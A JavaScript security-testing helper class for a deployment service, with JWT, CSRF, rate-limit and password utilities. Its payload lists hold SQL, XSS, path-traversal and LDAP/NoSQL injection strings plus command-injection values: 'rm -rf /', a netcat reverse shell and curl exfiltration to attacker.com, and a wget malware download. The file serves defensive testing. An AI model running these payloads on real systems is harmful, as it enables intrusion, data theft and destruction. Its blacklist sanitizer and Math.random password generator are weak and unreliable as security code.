/**
 * Security Testing Utilities
 * Provides common security testing functions and helpers
 */

const crypto = require('crypto');
const jwt = require('jsonwebtoken');

class SecurityTestUtils {
  constructor() {
    this.testSecret = process.env.JWT_SECRET || 'test-jwt-secret-for-security-testing';
    this.rateLimitMemory = new Map();
  }

  /**
   * Generate a test JWT token with specified claims
   * @param {string} username - Username for the token
   * @param {Array} permissions - Array of permissions
   * @param {Object} options - Additional token options
   * @returns {string} JWT token
   */
  generateTestToken(username, permissions = [], options = {}) {
    const defaultClaims = {
      sub: username,
      exp: Math.floor(Date.now() / 1000) + (options.expiresIn || 3600),
      iat: Math.floor(Date.now() / 1000),
      roles: permissions,
      userId: `user-${username}`,
      sessionId: `session-${username}-${Date.now()}`
    };

    const claims = { ...defaultClaims, ...options.claims };
    const secret = options.secret || this.testSecret;
    const algorithm = options.algorithm || 'HS256';

    return jwt.sign(claims, secret, { algorithm });
  }

  /**
   * Generate an expired JWT token
   * @param {string} username - Username for the token
   * @param {Array} permissions - Array of permissions
   * @returns {string} Expired JWT token
   */
  generateExpiredToken(username, permissions = []) {
    return this.generateTestToken(username, permissions, {
      expiresIn: -3600 // Expired 1 hour ago
    });
  }

  /**
   * Generate a malformed JWT token
   * @param {string} type - Type of malformation
   * @returns {string} Malformed JWT token
   */
  generateMalformedToken(type = 'invalid-signature') {
    const validToken = this.generateTestToken('test-user', ['deployment:read']);
    
    switch (type) {
      case 'invalid-signature':
        const parts = validToken.split('.');
        return `${parts[0]}.${parts[1]}.invalid-signature`;
      
      case 'missing-signature':
        return validToken.split('.').slice(0, 2).join('.');
      
      case 'invalid-header':
        const [header, payload, signature] = validToken.split('.');
        const invalidHeader = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'none' }))
          .toString('base64url');
        return `${invalidHeader}.${payload}.${signature}`;
      
      case 'invalid-payload':
        const [validHeader, , validSignature] = validToken.split('.');
        const invalidPayload = Buffer.from('invalid-json')
          .toString('base64url');
        return `${validHeader}.${invalidPayload}.${validSignature}`;
      
      default:
        return 'invalid.token.format';
    }
  }

  /**
   * Generate attack payloads for testing
   * @param {string} type - Type of attack payload
   * @returns {Array} Array of attack payloads
   */
  generateAttackPayloads(type) {
    const payloads = {
      'sql-injection': [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users; --",
        "'; INSERT INTO users (username) VALUES ('hacker'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('1'='1'",
        "' OR (SELECT COUNT(*) FROM users) > 0 --"
      ],
      'path-traversal': [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\/....\/....\/etc\/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '../../../../../../../etc/passwd%00',
        '....//....//....//....//....//....//....//etc//passwd',
        '..\\..\\..\\..\\..\\..\\..\\etc\\passwd'
      ],
      'xss': [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input type="text" onfocus="alert(1)" autofocus>',
        '<marquee onstart="alert(1)">',
        '<details open ontoggle="alert(1)">'
      ],
      'command-injection': [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& whoami',
        '|| id',
        '`whoami`',
        '$(whoami)',
        '; nc -e /bin/sh attacker.com 4444',
        '| curl http://attacker.com/steal?data=$(cat /etc/passwd)',
        '&& wget http://attacker.com/malware.sh -O /tmp/malware.sh',
        '; python -c "import os; os.system(\'id\')"'
      ],
      'ldap-injection': [
        '*)(&(objectClass=user)',
        '*)|(objectClass=*)',
        '*)(&(userPassword=*))',
        '*)(&(|(objectClass=user)(objectClass=person)))',
        '*)(&(cn=*))',
        '*)(&(mail=*))',
        '*)(&(uid=*))',
        '*)(&(sn=*))',
        '*)(&(givenName=*))',
        '*)(&(memberOf=*))'
      ],
      'nosql-injection': [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '{"$or": [{"username": "admin"}, {"username": "root"}]}',
        '{"username": {"$in": ["admin", "root"]}}',
        '{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
        '{"$nor": [{"username": "guest"}]}',
        '{"password": {"$exists": true}}',
        '{"$text": {"$search": "admin"}}'
      ]
    };

    return payloads[type] || [];
  }

  /**
   * Simulate rate limiting for testing
   * @param {string} key - Rate limit key
   * @param {number} limit - Request limit
   * @param {number} window - Time window in milliseconds
   * @returns {boolean} Whether request is within limit
   */
  checkRateLimit(key, limit = 10, window = 60000) {
    const now = Date.now();
    const windowStart = now - window;
    
    if (!this.rateLimitMemory.has(key)) {
      this.rateLimitMemory.set(key, []);
    }
    
    const requests = this.rateLimitMemory.get(key);
    
    // Remove old requests
    const recentRequests = requests.filter(timestamp => timestamp > windowStart);
    
    if (recentRequests.length >= limit) {
      return false;
    }
    
    recentRequests.push(now);
    this.rateLimitMemory.set(key, recentRequests);
    
    return true;
  }

  /**
   * Reset rate limiting state
   * @param {string} key - Rate limit key to reset (optional)
   */
  resetRateLimit(key = null) {
    if (key) {
      this.rateLimitMemory.delete(key);
    } else {
      this.rateLimitMemory.clear();
    }
  }

  /**
   * Generate test webhook signature
   * @param {Object} payload - Webhook payload
   * @param {string} secret - Webhook secret
   * @returns {string} Webhook signature
   */
  generateWebhookSignature(payload, secret) {
    const payloadString = JSON.stringify(payload);
    const signature = crypto
      .createHmac('sha256', secret)
      .update(payloadString)
      .digest('hex');
    
    return `sha256=${signature}`;
  }

  /**
   * Generate test CSRF token
   * @param {string} sessionId - Session ID
   * @returns {string} CSRF token
   */
  generateCSRFToken(sessionId) {
    const timestamp = Date.now();
    const data = `${sessionId}:${timestamp}`;
    const token = crypto
      .createHmac('sha256', this.testSecret)
      .update(data)
      .digest('hex');
    
    return `${timestamp}:${token}`;
  }

  /**
   * Validate CSRF token
   * @param {string} token - CSRF token
   * @param {string} sessionId - Session ID
   * @param {number} maxAge - Maximum age in milliseconds
   * @returns {boolean} Whether token is valid
   */
  validateCSRFToken(token, sessionId, maxAge = 3600000) {
    try {
      const [timestamp, expectedToken] = token.split(':');
      const tokenTimestamp = parseInt(timestamp);
      
      // Check if token is not too old
      if (Date.now() - tokenTimestamp > maxAge) {
        return false;
      }
      
      // Verify token
      const data = `${sessionId}:${timestamp}`;
      const validToken = crypto
        .createHmac('sha256', this.testSecret)
        .update(data)
        .digest('hex');
      
      return crypto.timingSafeEqual(
        Buffer.from(expectedToken),
        Buffer.from(validToken)
      );
    } catch (error) {
      return false;
    }
  }

  /**
   * Generate test password with specified criteria
   * @param {Object} options - Password generation options
   * @returns {string} Generated password
   */
  generateTestPassword(options = {}) {
    const {
      length = 16,
      includeUppercase = true,
      includeLowercase = true,
      includeNumbers = true,
      includeSymbols = true,
      excludeAmbiguous = true
    } = options;

    let charset = '';
    
    if (includeUppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (includeLowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (includeNumbers) charset += '0123456789';
    if (includeSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    if (excludeAmbiguous) {
      charset = charset.replace(/[0O1lI|]/g, '');
    }

    let password = '';
    for (let i = 0; i < length; i++) {
      password += charset.charAt(Math.floor(Math.random() * charset.length));
    }

    return password;
  }

  /**
   * Calculate password strength score
   * @param {string} password - Password to evaluate
   * @returns {Object} Password strength information
   */
  calculatePasswordStrength(password) {
    let score = 0;
    const checks = {
      length: password.length >= 12,
      uppercase: /[A-Z]/.test(password),
      lowercase: /[a-z]/.test(password),
      numbers: /\d/.test(password),
      symbols: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password),
      noRepeats: !/(.)\1{2,}/.test(password),
      noCommonPatterns: !/123|abc|qwe|asd|zxc|password|admin/i.test(password)
    };

    Object.values(checks).forEach(check => {
      if (check) score += 1;
    });

    const strength = {
      score: (score / Object.keys(checks).length) * 100,
      level: score < 3 ? 'weak' : score < 5 ? 'medium' : score < 7 ? 'strong' : 'very-strong',
      checks: checks
    };

    return strength;
  }

  /**
   * Generate test user with specific attributes
   * @param {Object} attributes - User attributes
   * @returns {Object} Test user object
   */
  generateTestUser(attributes = {}) {
    const defaultUser = {
      id: `user-${Date.now()}`,
      username: `testuser-${Date.now()}`,
      email: `test-${Date.now()}@example.com`,
      password: this.generateTestPassword(),
      roles: ['deployment:read'],
      active: true,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    return { ...defaultUser, ...attributes };
  }

  /**
   * Generate test deployment data
   * @param {Object} attributes - Deployment attributes
   * @returns {Object} Test deployment object
   */
  generateTestDeployment(attributes = {}) {
    const defaultDeployment = {
      id: `deploy-${Date.now()}`,
      repository: 'festion/home-assistant-config',
      branch: 'main',
      commit: this.generateRandomHash(),
      status: 'pending',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      createdBy: 'test-user',
      reason: 'Test deployment for security testing'
    };

    return { ...defaultDeployment, ...attributes };
  }

  /**
   * Generate random hash
   * @param {number} length - Hash length
   * @returns {string} Random hash
   */
  generateRandomHash(length = 40) {
    return crypto.randomBytes(length / 2).toString('hex');
  }

  /**
   * Generate test API key
   * @param {Object} options - API key options
   * @returns {string} API key
   */
  generateAPIKey(options = {}) {
    const { prefix = 'test', length = 32 } = options;
    const randomPart = crypto.randomBytes(length).toString('hex');
    return `${prefix}_${randomPart}`;
  }

  /**
   * Validate email format
   * @param {string} email - Email to validate
   * @returns {boolean} Whether email is valid
   */
  isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  /**
   * Sanitize input string
   * @param {string} input - Input to sanitize
   * @returns {string} Sanitized input
   */
  sanitizeInput(input) {
    if (typeof input !== 'string') {
      return input;
    }

    return input
      .replace(/[<>]/g, '') // Remove angle brackets
      .replace(/javascript:/gi, '') // Remove javascript: protocol
      .replace(/on\w+\s*=/gi, '') // Remove event handlers
      .replace(/['";\\]/g, '') // Remove quotes and backslashes
      .trim();
  }

  /**
   * Generate test request headers
   * @param {Object} options - Header options
   * @returns {Object} Request headers
   */
  generateTestHeaders(options = {}) {
    const {
      includeAuth = true,
      includeCSRF = false,
      userAgent = 'Security-Test-Agent/1.0',
      contentType = 'application/json'
    } = options;

    const headers = {
      'Content-Type': contentType,
      'User-Agent': userAgent,
      'Accept': 'application/json',
      'X-Requested-With': 'XMLHttpRequest'
    };

    if (includeAuth) {
      headers['Authorization'] = `Bearer ${this.generateTestToken('test-user')}`;
    }

    if (includeCSRF) {
      headers['X-CSRF-Token'] = this.generateCSRFToken('test-session');
    }

    return headers;
  }

  /**
   * Measure response time
   * @param {Function} fn - Function to measure
   * @returns {Object} Response time information
   */
  async measureResponseTime(fn) {
    const start = process.hrtime.bigint();
    const result = await fn();
    const end = process.hrtime.bigint();
    
    const duration = Number(end - start) / 1000000; // Convert to milliseconds
    
    return {
      result,
      duration,
      timestamp: Date.now()
    };
  }

  /**
   * Generate test vulnerability report
   * @param {Array} vulnerabilities - Array of vulnerabilities
   * @returns {Object} Vulnerability report
   */
  generateVulnerabilityReport(vulnerabilities = []) {
    const severityCount = {
      critical: 0,
      high: 0,
      medium: 0,
      low: 0
    };

    vulnerabilities.forEach(vuln => {
      if (severityCount[vuln.severity] !== undefined) {
        severityCount[vuln.severity]++;
      }
    });

    const totalScore = vulnerabilities.reduce((sum, vuln) => {
      const severityScores = { critical: 10, high: 7, medium: 5, low: 2 };
      return sum + (severityScores[vuln.severity] || 0);
    }, 0);

    const securityScore = Math.max(0, 100 - totalScore);

    return {
      timestamp: new Date().toISOString(),
      summary: {
        totalVulnerabilities: vulnerabilities.length,
        severityDistribution: severityCount,
        securityScore: securityScore,
        riskLevel: securityScore > 80 ? 'low' : securityScore > 60 ? 'medium' : securityScore > 40 ? 'high' : 'critical'
      },
      vulnerabilities: vulnerabilities,
      recommendations: this.generateSecurityRecommendations(vulnerabilities)
    };
  }

  /**
   * Generate security recommendations based on vulnerabilities
   * @param {Array} vulnerabilities - Array of vulnerabilities
   * @returns {Array} Security recommendations
   */
  generateSecurityRecommendations(vulnerabilities) {
    const recommendations = [];
    const vulnTypes = [...new Set(vulnerabilities.map(v => v.type))];

    vulnTypes.forEach(type => {
      switch (type) {
        case 'sql-injection':
          recommendations.push({
            type: 'sql-injection',
            priority: 'high',
            title: 'Implement Parameterized Queries',
            description: 'Use parameterized queries or prepared statements to prevent SQL injection attacks',
            action: 'Review and update all database queries to use parameterized queries'
          });
          break;

        case 'xss':
          recommendations.push({
            type: 'xss',
            priority: 'high',
            title: 'Implement Input Validation and Output Encoding',
            description: 'Validate all user inputs and encode outputs to prevent XSS attacks',
            action: 'Implement comprehensive input validation and output encoding mechanisms'
          });
          break;

        case 'path-traversal':
          recommendations.push({
            type: 'path-traversal',
            priority: 'medium',
            title: 'Implement Path Validation',
            description: 'Validate and sanitize all file paths to prevent directory traversal attacks',
            action: 'Implement strict path validation and use allow-lists for file access'
          });
          break;

        case 'authentication':
          recommendations.push({
            type: 'authentication',
            priority: 'critical',
            title: 'Strengthen Authentication Controls',
            description: 'Implement stronger authentication mechanisms and session management',
            action: 'Review and strengthen authentication and session management controls'
          });
          break;

        case 'authorization':
          recommendations.push({
            type: 'authorization',
            priority: 'high',
            title: 'Implement Proper Authorization Controls',
            description: 'Ensure proper authorization checks are in place for all resources',
            action: 'Implement and test comprehensive authorization controls'
          });
          break;

        default:
          recommendations.push({
            type: 'general',
            priority: 'medium',
            title: 'General Security Improvements',
            description: 'Implement general security best practices and regular security reviews',
            action: 'Conduct regular security assessments and implement security best practices'
          });
      }
    });

    return recommendations;
  }
}

module.exports = { SecurityTestUtils };